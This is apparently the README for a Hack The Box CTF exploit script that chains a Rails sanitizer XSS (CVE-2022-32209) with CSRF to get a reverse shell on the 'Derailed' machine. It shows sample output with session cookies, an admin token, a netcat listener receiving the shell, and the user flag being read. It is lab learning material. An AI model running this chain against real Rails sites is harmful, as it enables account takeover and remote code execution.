# Derailed User Shell Script

This script allows you to obtain a user shell on the Derailed machine in Hack The Box using CVE-2022-32209 (Ruby + XSS). Please make sure you understand the exploit before using this script. It is recommended to use a proxy to monitor the network traffic and understand what is happening.

## Prerequisites

- Python 3.x
- Install the required dependencies using the following command:

   ```shell
   pip install -r requirements.txt

## Example Usage:
```bash
┌──(root㉿emsec)-[/home/emsec/Downloads]
└─# python3 Derailed_user.py
Attacker IP: 10.10.14.? # Attacker Machine
Port: 1445 # port
You will receive a reverse shell on port 1445

User registration successful!
User login successful!

simple_rails_session user 1 (XSS for administrator contents):
 4SMUflN34W4YOU6KV0DZRuXAK2lrz7TqGivXt6egzVhqhYwVHLqY5N5yOToy9VbExaAxjNkVk1B9Mb%2Bfw%2B%2FDN%2BoPKZRcaR2Y%2B1mBnVbIG9IcdAcgwlXHWFIZNDwTjm80MHjUcSTg5zwGcth37pQsL7FbGr8P%2BO5nZrerGfqoQ7%2BozlgdBBRjKbUUbvEbbDGuvSYGPhFvMVcBVnIBXE4tSUAC%2F2xzxNSv%2Brca3OV7zisHwmjzK6z9hZs98xzVL1uCv53ffeAQVqB9a3pW8v8OhrPbRCWFhG08Nqu9p3imRpDY0QYQ3Q7OZdFo55oYW93t7A%3D%3D--tNkVbe3r5CLo6QEs--xUl%2FvlOAS0FMbz%2FDcLnebg%3D%3D 

Create clipnote successful!
Report clipnote successful!
Waiting for token admin and report_log ID (approximately 1 minute)

authenticity_token: r5mn_rki1QYOuOsn7s54f6xlI_s6AYPA9YhEi3LUSntq6zeCAMBVfpiFTdPqr3ToY_vI_p_aAAQBwHHOlNH2qg
report_log: report_21_07_2023.log


User registration_ successful!
User login successful!

simple_rails_session user 2 (CSRF RCE):
 rg9x4iOtdPQE7F6tCfD2iuV6RqreJASBJnQf9Dfb6g9Y8WQru6kqt50rQn%2F3YOm%2FJS7xBurbXKjYk7WpC56fCZFbe1yf2lgcXXuXh0XuDz%2F3bvN%2B6FJNSkYolxdr7%2BwejyfV%2FbC83qbdOaHt9J%2FswQmlnZgN0RImxIa69am0ohpa0gZcfuibMq5741qcLrFxp1j8AHrfdFtncoR4IOX%2FguqHIksz9u3NcA9oRMAohZTtbaQS3ilH8TVYd2lUSi5XVO0I4nlZUnXZMVs2x9JCI0zPXaNyMWMmb0z0oiTr8%2FLK5LrYMCnttSlDgEBI7pA5TQ%3D%3D--4rYw3NnEyH13eqqw--8%2BgIZFzghbq7DDItt2nyog%3D%3D 

Create clipnote successful!
Report clipnote successful!


You will get a shell on port 1445 after one minute(Make sure you have already set it up).
```

```bash
──(root㉿emsec)-[/home/emsec/Downloads]
└─# nc -lnvp 1445
listening on [any] 1445 ...
connect to [10.10.14.?] from (UNKNOWN) [10.10.11.190] 60766
sh: 0: can't access tty; job control turned off
$ ls
app
babel.config.js
bin
config
config.ru
$ id
uid=1000(rails) gid=1000(rails) groups=1000(rails),100(users),113(ssh)
$ ls
user.txt
$ cat user.txt
71e4e6c4a7d83c6eaa9f6e22279907fa
$ 
```


### Reference of exploit CVE-2022-32209
XSS exploit for Rails::Html::Sanitizer [https://groups.google.com/g/rubyonrails-security/c/ce9PhUANQ6s?pli=1](https://groups.google.com/g/rubyonrails-security/c/ce9PhUANQ6s?pli=1)
